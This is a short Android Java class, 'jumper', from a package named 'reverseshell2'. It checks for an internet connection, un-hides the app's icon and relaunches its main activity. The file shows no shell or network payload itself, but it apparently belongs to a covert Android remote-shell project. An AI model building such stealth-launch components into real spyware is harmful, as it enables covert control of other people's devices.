package com.example.reverseshell2;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Build;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class jumper {
    Context context;

    public jumper(Context context) {
        this.context = context;
    }

    public void init() {
        if (!isNetworkAvailable()) {
            return;
        }
        new functions(null).unHideAppIcon(context);
        Intent a = new Intent(context, MainActivity.class);
        a.addFlags(FLAG_ACTIVITY_NEW_TASK);
        a.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        context.startActivity(a);
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager cm =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) {
            return false;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Network network = cm.getActiveNetwork();
            if (network == null) {
                return false;
            }
            NetworkCapabilities caps = cm.getNetworkCapabilities(network);
            return caps != null
                    && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        }
        android.net.NetworkInfo info = cm.getActiveNetworkInfo();
        return info != null && info.isConnected();
    }
}
